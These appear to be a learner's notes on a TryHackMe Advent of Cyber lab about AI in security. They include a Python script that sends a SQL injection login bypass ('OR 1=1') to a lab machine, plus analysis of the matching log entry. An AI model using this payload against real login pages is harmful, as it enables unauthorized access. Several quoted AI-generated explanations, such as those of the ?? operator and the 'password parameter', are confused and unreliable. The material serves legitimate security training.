# TryHackMe: 2025 Advent of Cyber (Day 4)
**Room Name**: AI in Security - old sAInt nick (my own notes w/ some provided notes via THM room)

### Introduction
**Learning Objectives**
- How AI can be used as an assistant in cyber security for a variety of roles, domains and tasks
- Using an AI assistant to solve various tasks within cyber security
- Some of the considerations, particulary in cyber security, surrounding the usage of AI

### AI for Cyber Security Showcase
- AI is used in cybersecurity in various ways, like reducing time in repetitive tasks to focus more on critical tasks that require human knowledge.
- AI in cybersecurity benefits includes (processing large amounts of data, behaviour analysis, generative AI)
- AI in cybersecurity can be used in defensive security, offensive security, as well as software development (vibe-coding) but be more cautious because AI isn't 100% accurate and using AI in software development is more better for looking for any vulnerabilities that lies rather then letting AI write code, since AI can find vulnerabilities in code more than it can write code.

<br>

**Practical Lab**
- Red Team - Discover how AI can be used to generate scripts to exploit vulnerabilities
- Blue Team - See how AI can be used to analyse logs
- Software Security - Harness the power of AI to review source code and identify how vulnerabilities are introduced

**<mark>Red Team</mark>**<br>
The vulnerability exists because the SQL injection attack exploits the username field to execute malicious SQL code. The username field is vulnerable to SQL injection when an attacker can manipulate the input to include malicious SQL syntax. The OR clause in the username field allows the attacker to include any SQL query, even if the password is not used. This makes the login page susceptible to unauthorized access. 

The vulnerability exists because the SQL injection attack is triggered by the username field, which allows attackers to input malicious SQL code. The username field is a string, so when the attacker inputs a username like "alice", the SQL statement is executed as "alice' OR 1=1 -- -". This simple OR condition makes the vulnerability very basic, but it's intentional for educational purposes. To save the script, follow these steps:

1. Open the terminal or visual editor.
2. Use nano [script.py] to create the file.
3. Paste the script into the file.
4. Save it with Ctrl + O.
5. Exit using Ctrl + X.
6. Run the script with python3 [script.py]

This setup demonstrates how a basic SQL injection can be used to exploit a login form
```
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```
<br>

**<mark>Blue Team</mark>**<br>
Log Entry:
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

### Analysis of the Logs
Log Details:
- IP Address: 198.51.100.22
- Time: 3 October 2025 at 09:03
- URL: /login.php
- Username Attempted: "alice"
- SQL Injection: The password parameter "username=alice%27+OR+1%3D1+--+-&password=test" contains SQL injection code (%27, %3D, %+-). This indicates a vulnerability in the application\u2019s password validation logic.

**Why It Matters:**
- Vulnerability Detection: Logging such attacks helps identify potential weaknesses in the system. Blue Team analysis can highlight the need for updates to secure password fields.
- Early Detection: By analyzing logs, teams can quickly detect anomalies and prioritize patches, reducing the risk of further attacks.

**Blue Team Perspective:**
- **Identify Risks**: The log entry shows an opportunity for malicious activity, prompting immediate attention to password validation flaws.
- **Improve Security**: Implement stricter input validation and use of secure password formats to prevent such vulnerabilities.

<br>

**<mark>Software Security</mark>**<br>
php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';

**FORMATTING GUIDELINES:**
- Identification of the specific vulnerability: The code uses ?? to initialize variables, which is a best practice for handling empty strings. However, this is not a vulnerability but a secure coding practice.
- Explanation of why the code is vulnerable: The variables $user and $pass are initialized with ??, which is a safe way to avoid errors. However, if the POST data is missing, the user's input is directly used in a query, which can be exploited if the query is not properly sanitized. This is a classic case of SQL injection.

- Best practices for preventing similar issues: Use prepared statements or parameterized queries to prevent SQL injection. Always sanitize user input before using it in a query.
- Tools and techniques for code security testing: Use tools like OWASP ZAP or SQLmap to test for vulnerabilities. Implement input validation and sanitization to prevent similar issues.
